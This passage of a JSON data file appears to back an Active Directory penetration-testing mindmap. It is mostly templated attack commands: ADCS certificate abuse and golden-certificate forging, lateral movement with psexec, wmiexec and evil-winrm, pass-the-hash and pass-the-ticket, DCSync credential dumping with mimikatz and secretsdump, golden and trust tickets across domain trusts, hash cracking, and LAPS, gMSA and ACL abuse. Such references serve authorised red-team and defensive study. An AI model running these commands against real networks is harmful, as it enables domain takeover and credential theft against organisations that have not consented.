$USER@$DOMAIN --application-policies 'Client Authentication' #[PR 228]","outcome":"Pass the certificate (only Schannel)"},{"id":"adcs-95","label":"","children":[{"id":"adcs-96","label":"","cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template '$VULN_TEMPLATE' -ca $CA_NAME -on-behalf-of '$DOMAIN\\$USER' -pfx $PFX_FILE"}],"cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template '$VULN_TEMPLATE' -ca $CA_NAME --application-policies 'Certificate Request Agent' # [PR 228]","outcome":"Pass the certificate"}]}]},{"id":"adcs-97","label":"Misconfigured ACL","children":[{"id":"adcs-98","label":"ESC4","children":[{"id":"adcs-99","label":"write privilege over a certificate template","children":[{"id":"adcs-100","label":"","cmd":"certipy template -u $USER@$DOMAIN -p '$PASSWORD' -template $VULN_TEMPLATE -save-old -debug","outcome":"ESC1"},{"id":"adcs-101","label":"restore template","children":[{"id":"adcs-102","label":"","cmd":"certipy template -u $USER@$DOMAIN -p '$PASSWORD' -template $VULN_TEMPLATE -configuration $TEMPLATE.json"}]}]}]},{"id":"adcs-103","label":"ESC7","children":[{"id":"adcs-104","label":"Manage CA","children":[{"id":"adcs-105","label":"","cmd":"certipy ca -ca $CA_NAME -add-officer  '$USER' -username $USER@$DOMAIN -password $PASSWORD -dc-ip $DC_IP -target-ip $TARGET","outcome":"ESC7 Manage certificate"}]},{"id":"adcs-106","label":"Manage certificate","children":[{"id":"adcs-107","label":"","children":[{"id":"adcs-108","label":"","children":[{"id":"adcs-109","label":"error, but save private key and get issue request"}],"cmd":"certipy  req -username $USER@$DOMAIN -password $PASSWORD -ca $CA_NAME -template '$VULN_TEMPLATE' -upn '$USER'"}],"cmd":"certipy ca  -ca $CA_NAME -enable-template '$VULN_TEMPLATE' -username $USER@$DOMAIN -password $PASSWORD"},{"id":"adcs-110","label":"Issue request","children":[{"id":"adcs-111","label":"","children":[{"id":"adcs-112","label":"","cmd":"certipy req -u $USER@$DOMAIN -p '$PASSWORD'  -ca $CA_NAME -retreive $REQUEST_ID","outcome":"Pass the certificate"}],"cmd":"certipy ca -u $USER@$DOMAIN -p '$PASSWORD' -ca $CA_NAME -issue-request $REQUEST_ID"}]}]}]}]},{"id":"adcs-113","label":"Vulnerable PKI Object access control","children":[{"id":"adcs-114","label":"ESC5","children":[{"id":"adcs-115","label":"Vulnerable acl on PKI","outcome":"ACL"},{"id":"adcs-116","label":"Golden certificate","children":[{"id":"adcs-117","label":"","children":[{"id":"adcs-118","label":"","cmd":"certipy forge -ca-pfx '$PFX_FILE' -upn administrator@$DOMAIN","outcome":"Pass the certificate"}],"cmd":"certipy ca -backup -u $USER@$DOMAIN -hashes $NT_HASH -ca $CA_NAME -debug -target $TARGET"}]}]}]},{"id":"adcs-119","label":"Misconfigured Certificate Authority","children":[{"id":"adcs-120","label":"ESC6","children":[{"id":"adcs-121","label":"Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication"}],"outcome":"ESC1"},{"id":"adcs-122","label":"ESC11","children":[{"id":"adcs-123","label":"","children":[{"id":"adcs-124","label":"","cmd":"Rubeus.exe asktgt /user:$USER /certificate:$BASE64_CERTIFICATE /ptt"},{"id":"adcs-125","label":"","cmd":"gettgtpkinit.py -pfx-base64 $(cat cert.b64) $DOMAIN/$DC_NAME$ $CCACHE_FILE"}],"cmd":"ntlmrelayx.py -t rpc://$TARGET -smb2support -rpc-mode ICPR -icpr-ca-name $CA_NAME"},{"id":"adcs-126","label":"","children":[{"id":"adcs-127","label":"","cmd":"certipy auth -pfx $PFX_FILE -dc-ip $DC_IP"}],"cmd":"certipy relay -target rpc://$TARGET -ca '$CA_NAME'"}],"outcome":"Pass the ticket >>> DCSYNC >>> Domain Admin"}]},{"id":"adcs-128","label":"Abuse Certificate Mapping","children":[{"id":"adcs-129","label":"ESC9/ESC10 (implicit)","children":[{"id":"adcs-130","label":"","children":[{"id":"adcs-131","label":"ESC9/ESC10 (Case 1)","children":[{"id":"adcs-132","label":"","children":[{"id":"adcs-133","label":"ESC9","children":[{"id":"adcs-134","label":"","cmd":"certipy req  -username $ACCOUNTB@$DOMAIN -hashes $HASHB -ca $CA_NAME -template $VULN_TEMPLATE"}]},{"id":"adcs-135","label":"ESC10 (case 1)","children":[{"id":"adcs-136","label":"","cmd":"certipy req  -username $ACCOUNTB@$DOMAIN -hashes $HASHB -ca $CA_NAME -template $ANY_TEMPLATE_WITH_CLIENT_AUTH"}]}],"cmd":"certipy account update -username $ACCOUNTA@$DOMAIN -password $PASSA -user $ACCOUNTB -upn Administrator","outcome":"reset accountB UPN"}]},{"id":"adcs-137","label":"ESC10 (Case 2)","children":[{"id":"adcs-138","label":"","cmd":"certipy account update -username $ACCOUNTA@$DOMAIN -password $PASSA -user $ACCOUNTB -upn '$DC_NAME@$DOMAIN'","outcome":"ESC10  Case1"}]}],"cmd":"certipy shadow auto -username $ACCOUNTA@$DOMAIN -p $PASSA -account $ACCOUNTB"},{"id":"adcs-139","label":"reset accountB UPN","children":[{"id":"adcs-140","label":"","children":[{"id":"adcs-141","label":"[Kerberos Mapping] ESC9/ESC10(Case 1)"},{"id":"adcs-142","label":"[Schannel Mapping] ESC9/ESC10 (Case 2)"}],"cmd":"certipy account update -username $ACCOUNTA@$DOMAIN -password $PASSA -user $ACCOUNTB -upn $ACCOUNTB@$DOMAIN","outcome":"Pass The Certificate"}]}]},{"id":"adcs-143","label":"ESC14 (explicit)"}]}],"row":1,"col":4},{"id":"lat_move","label":"Lateral Move","color":"#868e96","children":[{"id":"lat_move-406","label":"Clear text Password","children":[{"id":"lat_move-407","label":"Interactive-shell - psexec","children":[{"id":"lat_move-408","label":"","cmd":"psexec.py $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"lat_move-409","label":"","cmd":"psexec.exe -AcceptEULA \\\\$TARGET"},{"id":"lat_move-410","label":"","cmd":"psexecsvc.py $DOMAIN/$USER:$PASSWORD@$TARGET"}],"outcome":"Authority/System"},{"id":"lat_move-411","label":"Pseudo-shell (file write and read)","children":[{"id":"lat_move-412","label":"","cmd":"atexec.py  $DOMAIN/$USER:$PASSWORD@$TARGET \"command\""},{"id":"lat_move-413","label":"","cmd":"smbexec.py  $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"lat_move-414","label":"","cmd":"wmiexec.py  $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"lat_move-415","label":"","cmd":"dcomexec.py  $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"lat_move-416","label":"","cmd":"nxc smb $IP_RANGE -u $USER -p $PASSWORD -d $DOMAIN -x $CMD"}]},{"id":"lat_move-417","label":"WinRM","children":[{"id":"lat_move-418","label":"","cmd":"evil-winrm -i $TARGET -u $USER -p $PASSWORD"},{"id":"lat_move-419","label":"","cmd":"Enter-PSSession -ComputerName $COMPUTER -Credential $DOMAIN\\$USER"},{"id":"lat_move-420","label":"","cmd":"nxc winrm $IP_RANGE -u $USER -p $PASSWORD -d $DOMAIN -x $CMD"}],"outcome":"Low access || Admin"},{"id":"lat_move-421","label":"RDP","children":[{"id":"lat_move-422","label":"","cmd":"xfreerdp /u:$USER /d:$DOMAIN /p:$PASSWORD /v:$TARGET"}],"outcome":"Low access || Admin"},{"id":"lat_move-423","label":"SMB","children":[{"id":"lat_move-424","label":"","cmd":"smbclient.py $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"lat_move-425","label":"","cmd":"smbclient-ng.py -d $DOMAIN -u $USER -p $PASSWORD --host $TARGET"}],"outcome":"Search files"},{"id":"lat_move-426","label":"MSSQL","children":[{"id":"lat_move-427","label":"","cmd":"nxc mssql $IP_RANGE -u $USER -p $PASSWORD"},{"id":"lat_move-428","label":"","cmd":"mssqlclient.py -windows-auth $DOMAIN/$USER:$PASSWORD@$TARGET"}],"outcome":"MSSQL"}],"outcome":"Admin"},{"id":"lat_move-429","label":"NT Hash","children":[{"id":"lat_move-430","label":"Pass the Hash","children":[{"id":"lat_move-431","label":"MSSQL/PseudoShell PsExec/SMB...","children":[{"id":"lat_move-432","label":"","cmd":"impacket : same as with creds, but use -hashes ':$NT_HASH'"},{"id":"lat_move-433","label":"","cmd":"nxc : same as with creds, but use -H ':$NT_HASH'"}],"outcome":"Admin"},{"id":"lat_move-434","label":"","cmd":"mimikatz \"privilege::debug sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NT_HASH\"","outcome":"Admin"},{"id":"lat_move-435","label":"RDP","children":[{"id":"lat_move-436","label":"","children":[{"id":"lat_move-437","label":"","cmd":"xfreerdp /u:$USER /d:$DOMAIN /pth:$NT_HASH /v:$TARGET"}],"cmd":"reg.py $DOMAIN/$USER@$TARGET -hashes ':$NT_HASH' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'"}],"outcome":"Low access || Admin"},{"id":"lat_move-438","label":"WinRM","children":[{"id":"lat_move-439","label":"","cmd":"evil-winrm -i $TARGET -u $USER -H $NT_HASH"}],"outcome":"Low access || Admin"}]},{"id":"lat_move-440","label":"Overpass the Hash / Pass the key (PTK)","children":[{"id":"lat_move-441","label":"","children":[{"id":"lat_move-442","label":"","cmd":"Rubeus.exe ptt /ticket:$TICKET"},{"id":"lat_move-443","label":"","cmd":"Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]"}],"cmd":"Rubeus.exe asktgt /user:$USER /rc4:$NT_HASH"},{"id":"lat_move-444","label":"","cmd":"getTGT.py $DOMAIN/$USER -hashes :$NT_HASH"}],"outcome":"Admin"}]},{"id":"lat_move-445","label":"Kerberos","children":[{"id":"lat_move-446","label":"Pass the Ticket (ccache / kirbi)","children":[{"id":"lat_move-447","label":"Convert Format","children":[{"id":"lat_move-448","label":"","cmd":"ticketConverter.py $KIRBI_CCACHE $CCACHE_FILE"}]},{"id":"lat_move-449","label":"","children":[{"id":"lat_move-450","label":"","cmd":"impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket"}],"cmd":"export KRB5CCNAME=$CCACHE_FILE","outcome":"Admin"},{"id":"lat_move-451","label":"","cmd":"mimikatz kerberos::ptc \"$TICKET\""},{"id":"lat_move-452","label":"","cmd":"Rubeus.exe ptt /ticket:$TICKET"},{"id":"lat_move-453","label":"","cmd":"proxychains secretsdump.py -k'$DOMAIN'/'$USER'@'$TARGET'"},{"id":"lat_move-454","label":"Modify SPN","children":[{"id":"lat_move-455","label":"","cmd":"tgssub.py -in $CCACHE_FILE -out $NEWTICKET_CCACHE -altservice \"$SERVICE/$TARGET\" #pr 1256"}],"outcome":"PassTheTicket"}]},{"id":"lat_move-456","label":"Aeskey","children":[{"id":"lat_move-457","label":"","cmd":"impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)"},{"id":"lat_move-458","label":"","cmd":"proxychains secretsdump.py -aesKey $AESKEY '$DOMAIN'/'$USER'@'$TARGET'"}],"outcome":"Admin"}]},{"id":"lat_move-459","label":"Socks (relay)","children":[{"id":"lat_move-460","label":"","cmd":"proxychains lookupsid.py $DOMAIN/$USER@$TARGET -no-pass -domain-sids"},{"id":"lat_move-461","label":"","cmd":"proxychains mssqlclient.py -windows-auth $DOMAIN/$USER@$TARGET -no-pass","outcome":"MSSQL"},{"id":"lat_move-462","label":"","cmd":"proxychains secretsdump.py -no-pass '$DOMAIN'/'$USER'@'$TARGET'","outcome":"DCSYNC"},{"id":"lat_move-463","label":"","cmd":"proxychains smbclient.py -no-pass $USER@$TARGET","outcome":"Search files"},{"id":"lat_move-464","label":"","cmd":"proxychains atexec.py  -no-pass  $DOMAIN/$USER@$TARGET \"command\"","outcome":"Authority/System"},{"id":"lat_move-465","label":"","cmd":"proxychains smbexec.py  -no-pass  $DOMAIN/$USER@$TARGET","outcome":"Authority/System"}]},{"id":"lat_move-466","label":"Certificate (pfx)","children":[{"id":"lat_move-467","label":"unpac the hash","children":[{"id":"lat_move-468","label":"","cmd":"certipy auth -pfx $PFX_FILE -dc-ip $DC_IP"},{"id":"lat_move-469","label":"","children":[{"id":"lat_move-470","label":"","cmd":"getnthash.py -key '$AS_REP_ENCRYPTION_KEY' '$DOMAIN'/'$DC_NAME'"}],"cmd":"gettgtpkinit.py -cert-pfx $PFX_FILE -pfx-pass $PASSWORD \"$DOMAIN/$DC_NAME\" $CCACHE_FILE"}]},{"id":"lat_move-471","label":"Pass the certificate","children":[{"id":"lat_move-472","label":"pkinit","children":[{"id":"lat_move-473","label":"","cmd":"gettgtpkinit.py -cert-pfx \"$PFX_FILE\" ^[-pfx-pass  \"$PASSWORD\"] \"$DOMAIN/$USER\" \"$CCACHE_FILE\""},{"id":"lat_move-474","label":"","cmd":"Rubeus.exe asktgt /user:\"$USER\" /certificate:\"$PFX_FILE\" [/password:\"$PASSWORD\"] /domain:\"$DOMAIN\" /dc:\"$DC_IP\" /show"},{"id":"lat_move-475","label":"","cmd":"certipy auth -pfx $PFX_FILE -dc-ip $DC_IP"}]},{"id":"lat_move-476","label":"schannel","children":[{"id":"lat_move-477","label":"","children":[{"id":"lat_move-478","label":"add_computer","children":[{"id":"lat_move-479","label":"Set RBCD","outcome":"RBCD"}]}],"cmd":"certipy auth -pfx $PFX_FILE -ldap-shell"},{"id":"lat_move-480","label":"","children":[{"id":"lat_move-481","label":"","children":[{"id":"lat_move-482","label":"","cmd":"passthecert.py -action ldap-shell -crt $USER_CRT -key $USER_KEY -domain $DOMAIN -dc-ip $DC_IP"}],"cmd":"certipy cert -pfx \"$PFX_FILE\" -nocert -out \"user.key\""}],"cmd":"certipy cert -pfx \"$PFX_FILE\" -nokey -out \"user.crt\""}]}]}]},{"id":"lat_move-483","label":"MSSQL","children":[{"id":"lat_move-484","label":"find mssql access","children":[{"id":"lat_move-485","label":"","cmd":"nxc mssql $TARGET -u $USER -p $PASSWORD -d $DOMAIN","outcome":"MSSQL"}]},{"id":"lat_move-486","label":"Users or Computers with SQL admin"},{"id":"lat_move-487","label":"","cmd":"MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p","outcome":"MSSQL"},{"id":"lat_move-488","label":"","children":[{"id":"lat_move-489","label":"","cmd":"enum_db"},{"id":"lat_move-490","label":"","children":[{"id":"lat_move-491","label":"","cmd":"xp_cmdshell $CMD","outcome":"Low Access"}],"cmd":"enable_xp_cmdshell"},{"id":"lat_move-492","label":"","children":[{"id":"lat_move-493","label":"","cmd":"exec_as_user $USER","outcome":"MSSQL"},{"id":"lat_move-494","label":"","cmd":"exec_as_login $LOGIN","outcome":"MSSQL"}],"cmd":"enum_impersonate"},{"id":"lat_move-495","label":"","cmd":"xp_dir_tree $TARGET","outcome":"COERCE SMB"},{"id":"lat_move-496","label":"","children":[{"id":"lat_move-497","label":"","children":[{"id":"lat_move-498","label":"","cmd":"use_link","outcome":"MSSQL || Trust"}],"cmd":"sp_linkedservers"}],"cmd":"trustlink"}],"cmd":"mssqlclient.py -windows-auth $DOMAIN/$USER:$PASSWORD@$TARGET"}]}],"row":1,"col":5},{"id":"trusts","label":"Trusts","color":"#6D8764","children":[{"id":"trusts-759","label":"Enumeration","children":[{"id":"trusts-760","label":"","cmd":"nltest.exe /trusted_domains"},{"id":"trusts-761","label":"","cmd":"([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"},{"id":"trusts-762","label":"","cmd":"Get-DomainTrust -Domain $DOMAIN"},{"id":"trusts-763","label":"","cmd":"Get-DomainTrustMapping"},{"id":"trusts-764","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP trusts"},{"id":"trusts-765","label":"","children":[{"id":"trusts-766","label":"","cmd":"MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p"}],"cmd":"sharphound.exe -c trusts -d $DOMAIN"},{"id":"trusts-767","label":"Get Domains SID","children":[{"id":"trusts-768","label":"","cmd":"Get-DomainSID -Domain $DOMAIN Get-DomainSID -Domain $TARGET_DOMAIN"},{"id":"trusts-769","label":"","cmd":"lookupsid.py -domain-sids $DOMAIN/$USER:$PASSWORD'@$DC_IP 0 lookupsid.py -domain-sids $DOMAIN/$USER:$PASSWORD'@$TARGET_DC 0"}]}]},{"id":"trusts-770","label":"Child->Parent","children":[{"id":"trusts-771","label":"Trust Key","children":[{"id":"trusts-772","label":"","children":[{"id":"trusts-773","label":"","cmd":"mimikatz kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$TRUST_KEY_AES256 /sids:$TARGET_DOMAIN_SID-519 /service:krbtgt /target:$TARGET_DOMAIN /ptt"}],"cmd":"mimikatz lsadump::trust /patch"},{"id":"trusts-774","label":"","children":[{"id":"trusts-775","label":"","cmd":"ticketer.py -nthash $TRUST_KEY -domain-sid $CHILD_SID -domain $CHILD_DOMAIN -extra-sid $PARENT_SID-519 -spn krbtgt/$PARENT_DOMAIN trustfakeuser"}],"cmd":"secretsdump.py -just-dc-user '$PARENT_DOMAIN$'   $DOMAIN/$USER:$PASSWORD@$DC_IP"}],"outcome":"PassTheTicket"},{"id":"trusts-776","label":"Golden Ticket","children":[{"id":"trusts-777","label":"","children":[{"id":"trusts-778","label":"","cmd":"mimikatz kerberos::golden /user:Administrator /krbtgt:$HASH_KRBTGT /domain:$DOMAIN /sid:$USER_SID /sids:$ROOTDOMAINSID_519 /ptt"}],"cmd":"mimikatz lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\\krbtgt"},{"id":"trusts-779","label":"","cmd":"raiseChild.py $CHILD_DOMAIN/$USER:$PASSWORD"},{"id":"trusts-780","label":"","cmd":"ticketer.py -nthash $CHILD_KRBTGT_HASH -domain-sid $CHILD_SID -domain $CHILD_DOMAIN -extra-sid $PARENT_SID-519 goldenuser"}],"outcome":"PassTheTicket"},{"id":"trusts-781","label":"Unconstrained delegation","children":[{"id":"trusts-782","label":"coerce parent_dc on child_dc domain","outcome":"unconstrained delegation"}]}]},{"id":"trusts-783","label":"Parent->Child","children":[{"id":"trusts-784","label":"same as Child to parent"}]},{"id":"trusts-785","label":"External Trust","children":[{"id":"trusts-786","label":"DomainA \u003c--> DomainB trust (B trust A, A trust B)","children":[{"id":"trusts-787","label":"from A to B FOREST_TRANSITIVE","children":[{"id":"trusts-788","label":"password reuse","outcome":"lat move (creds/pth/...)"},{"id":"trusts-789","label":"Foreign group and users","children":[{"id":"trusts-790","label":"Users with foreign Domain Group Membership","children":[{"id":"trusts-791","label":"","cmd":"MATCH p=(n:User {domain:\"$DOMAIN_FQDN\"})-[:MemberOf]->(m:Group) WHERE m.domain\u003c>n.domain RETURN p"}]},{"id":"trusts-792","label":"Group with foreign Domain Group Membership","children":[{"id":"trusts-793","label":"","cmd":"MATCH p=(n:Group {domain:\"$DOMAIN_FQDN\"})-[:MemberOf]->(m:Group) WHERE m.domain\u003c>n.domain RETURN p"}]}],"outcome":"ACL"},{"id":"trusts-794","label":"SID History on B","children":[{"id":"trusts-795","label":"Golden ticket","children":[{"id":"trusts-796","label":"","children":[{"id":"trusts-797","label":"","cmd":"mimikatz kerberos::golden /user:Administrator /krbtgt:$HASH_KRBTGT /domain:$DOMAIN /sid:$USER_SID /sids:$ROOTDOMAINSID-$GROUP_SID_SUP_1000 /ptt"}],"cmd":"mimikatz lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\\krbtgt"},{"id":"trusts-798","label":"","cmd":"ticketer.py -nthash $KRBTGT -domain-sid $DOMAIN_A -domain $DOMAIN_A -extra-sid $DOMAIN_B_SID-$GROUP_SID_SUP_1000 fakeuser"}]},{"id":"trusts-799","label":"Trust ticket","children":[{"id":"trusts-800","label":"","children":[{"id":"trusts-801","label":"","cmd":"ticketer.py -nthash $TRUST_HASH -domain-sid $SID_A -domain $DOMAIN_A -extra-sid $DOMAIN_B_SID-$GROUP_SID_SUP_1000 -spn krbtgt/$DOMAIN_A fakeuser"}],"cmd":"secretsdump.py -just-dc-user '$DOMAINB' $DOMAINA/$USER:'$PASSWORD'@$DC_A"}]}],"outcome":"PassTheTicket"},{"id":"trusts-802","label":"ADCS abuse","outcome":"ADCS"}]},{"id":"trusts-803","label":"from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL","children":[{"id":"trusts-804","label":"Unconstrained delegation","children":[{"id":"trusts-805","label":"coerce dc_b on dc_a","outcome":"unconstrained delegation"}]}]}]},{"id":"trusts-806","label":"DomainA \u003c-- DomainB trust (B trust A / A access B)","children":[{"id":"trusts-807","label":"Same as double trust, but no unconstrained delegation as B can't connect to A"}]},{"id":"trusts-808","label":"DomainA --> DomainB trust (A trust B / B access A)","children":[{"id":"trusts-809","label":"password reuse","outcome":"lat move (creds/pth/...)"}]}]},{"id":"trusts-810","label":"Mssql links","children":[{"id":"trusts-811","label":"MSSQL trusted links doesn't care of trust link","children":[{"id":"trusts-812","label":"","cmd":"Get-SQLServerLinkCrawl -username $USER -password $PASSWORD -Verbose -Instance $TARGET"},{"id":"trusts-813","label":"","children":[{"id":"trusts-814","label":"trustlink","children":[{"id":"trusts-815","label":"sp_linkedservers","children":[{"id":"trusts-816","label":"use_link"}]}]}],"cmd":"mssqlclient.py -windows-auth $DOMAIN/$USER:$PASSWORD@$TARGET"}]}],"outcome":"MSSQL"}],"row":1,"col":6},{"id":"crack_hash","label":"Crack hash","color":"#f08c00","children":[{"id":"crack_hash-287","label":"LM (299bd128c1101fd6)","children":[{"id":"crack_hash-288","label":"","cmd":"john --format=lm hash.txt --wordlist=$ROCKYOU_TXT"},{"id":"crack_hash-289","label":"","cmd":"hashcat -m 3000 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-290","label":"NT (b4b9b02e6f09a9bd760...)","children":[{"id":"crack_hash-291","label":"","cmd":"john --format=nt hash.txt --wordlist=$ROCKYOU_TXT"},{"id":"crack_hash-292","label":"","cmd":"hashcat -m 1000 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-293","label":"NTLMv1 (user::85D5BC...)","children":[{"id":"crack_hash-294","label":"","cmd":"john --format=netntlm hash.txt --wordlist=$ROCKYOU_TXT"},{"id":"crack_hash-295","label":"","cmd":"hashcat -m 1000 -a 0 hash.txt $ROCKYOU_TXT"},{"id":"crack_hash-296","label":"crack.sh"}]},{"id":"crack_hash-297","label":"NTLMv2 (user::N46iSNek...)","children":[{"id":"crack_hash-298","label":"","cmd":"john --format=netntlmv2 hash.txt --wordlist=$ROCKYOU_TXT"},{"id":"crack_hash-299","label":"","cmd":"hashcat -m 5600 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-300","label":"Kerberos 5 TGS ($krb5tgs$23$...)","children":[{"id":"crack_hash-301","label":"","cmd":"john --format=krb5tgs hash.txt --wordlist=$ROCKYOU_TXT"},{"id":"crack_hash-302","label":"","cmd":"hashcat -m 13100 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-303","label":"Kerberos 5 TGS AES128 ($krb5tgs$17...)","children":[{"id":"crack_hash-304","label":"","cmd":"hashcat -m 19600 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-305","label":"Kerberos ASREP ($krb5asrep$23...)","children":[{"id":"crack_hash-306","label":"","cmd":"hashcat -m 18200 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-307","label":"MSCache 2 (very slow) ($DCC2$10240...)","children":[{"id":"crack_hash-308","label":"","cmd":"hashcat -m 2100 -a 0 hash.txt $ROCKYOU_TXT"}]},{"id":"crack_hash-309","label":"Timeroast hash ($sntp-ms$...)","children":[{"id":"crack_hash-310","label":"","cmd":"hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l"}]},{"id":"crack_hash-311","label":"pxe hash ($sccm$aes128$...)","children":[{"id":"crack_hash-312","label":"","cmd":"hashcat -m 19850 -a 0 hash.txt $ROCKYOU_TXT"}]}],"row":2,"col":1},{"id":"acl","label":"ACLs/ACEs permissions","color":"#0050EF","children":[{"id":"acl-1","label":"Dcsync","children":[{"id":"acl-2","label":"Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts"},{"id":"acl-3","label":"","cmd":"mimikatz lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\\administrator"},{"id":"acl-4","label":"","cmd":"secretsdump.py '$DOMAIN'/'$USER':'$PASSWORD'@'$DC_NAME'"}],"outcome":"Domain Admin || Lateral move || Crack hash"},{"id":"acl-5","label":"can change msDS-KeyCredentialLInk (Generic Write) + ADCS","children":[{"id":"acl-6","label":"Shadow Credentials","children":[{"id":"acl-7","label":"","cmd":"certipy shadow auto '-u $USER@$DOMAIN' -p $PASSWORD -account '$TARGET_ACCOUNT'"},{"id":"acl-8","label":"","cmd":"pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\""}]}],"outcome":"PassTheCertificate"},{"id":"acl-9","label":"On Group","children":[{"id":"acl-10","label":"GenericAll/GenericWrite/Self/Add Extended Rights","children":[{"id":"acl-11","label":"Add member to the group"}]},{"id":"acl-12","label":"Write Owner","children":[{"id":"acl-13","label":"Grant Ownership"}]},{"id":"acl-14","label":"WriteDACL + WriteOwner","children":[{"id":"acl-15","label":"Grant rights","children":[{"id":"acl-16","label":"Give yourself generic all"}]}]}]},{"id":"acl-17","label":"On Computer","children":[{"id":"acl-18","label":"GenericAll / GenericWrite","children":[{"id":"acl-19","label":"msDs-AllowedToActOnBehalf","outcome":"RBCD"},{"id":"acl-20","label":"add Key Credentials","outcome":"shadow credentials"}]}]},{"id":"acl-21","label":"On User","children":[{"id":"acl-22","label":"GenericAll / GenericWrite","children":[{"id":"acl-23","label":"Change password","children":[{"id":"acl-24","label":"","cmd":"net user $USER $PASSWORD /domain","outcome":"User with clear text pass"}]},{"id":"acl-25","label":"add SPN (target kerberoasting)","children":[{"id":"acl-26","label":"","cmd":"targetedKerberoast.py -d $DOMAIN -u $USER -p $PASSWORD","outcome":"Hash found (TGS)"}]},{"id":"acl-27","label":"add key credentials","outcome":"shadow credentials"},{"id":"acl-28","label":"login script","outcome":"Access"}]},{"id":"acl-29","label":"ForceChangePassword","children":[{"id":"acl-30","label":"","cmd":"net user $USER $PASSWORD /domain","outcome":"User with clear text pass"}]}]},{"id":"acl-31","label":"On OU","children":[{"id":"acl-32","label":"Write Dacl","children":[{"id":"acl-33","label":"ACE Inheritance","children":[{"id":"acl-34","label":"Grant rights"}]}]},{"id":"acl-35","label":"GenericAll / GenericWrite / Manage Group Policy Links","children":[{"id":"acl-36","label":"","cmd":"OUned.py --config config.ini"}]}]},{"id":"acl-37","label":"ReadGMSAPassword","children":[{"id":"acl-38","label":"","cmd":"gMSADumper.py -u '$USER' -p '$PASSWORD' -d '$DOMAIN'"},{"id":"acl-39","label":"","cmd":"nxc ldap $DC_IP -u $USER -p $PASSWORD --gmsa"},{"id":"acl-40","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldaps://$DC_IP gmsa"}]},{"id":"acl-41","label":"Get LAPS passwords","children":[{"id":"acl-42","label":"Who can read LAPS","children":[{"id":"acl-43","label":"","cmd":"MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p"}]},{"id":"acl-44","label":"Read LAPS","children":[{"id":"acl-45","label":"","cmd":"Get-LapsADPassword -DomainController $DC_IP -Credential $DOMAIN\\$LOGIN | Format-Table -AutoSize"},{"id":"acl-46","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP laps"},{"id":"acl-47","label":"","cmd":"foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}"},{"id":"acl-48","label":"","cmd":"nxc ldap $DC_IP -d $DOMAIN -u $USER -p $PASSWORD --module laps"},{"id":"acl-49","label":"","cmd":"msf> use post/windows/gather/credentials/enum_laps"}],"outcome":"Admin"}]},{"id":"acl-50","label":"GPO","children":[{"id":"acl-51","label":"Who can control GPOs","children":[{"id":"acl-52","label":"","cmd":"MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p"}]},{"id":"acl-53","label":"SID of principals that can create new GPOs in the domain","children":[{"id":"acl-54","label":"","cmd":"Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl"}]},{"id":"acl-55","label":"Return the principals that can write to the GP-Link attribute on OUs","children":[{"id":"acl-56","label":"","cmd":"Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl"}]},{"id":"acl-57","label":"Generic Write on  GPO","children":[{"id":"acl-58","label":"Abuse GPO","outcome":"ACCESS"}]}]},{"id":"acl-59","label":"DNS Admin","children":[{"id":"acl-60","label":"DNSadmins abuse (CVE-2021-40469)","children":[{"id":"acl-61","label":"","cmd":"dnscmd.exe /config /serverlevelplugindll $PATH_TO_DLL # need a dnsadmin user"},{"id":"acl-62","label":"","cmd":"sc \\\\DNSServer stop dns sc \\\\DNSServer start 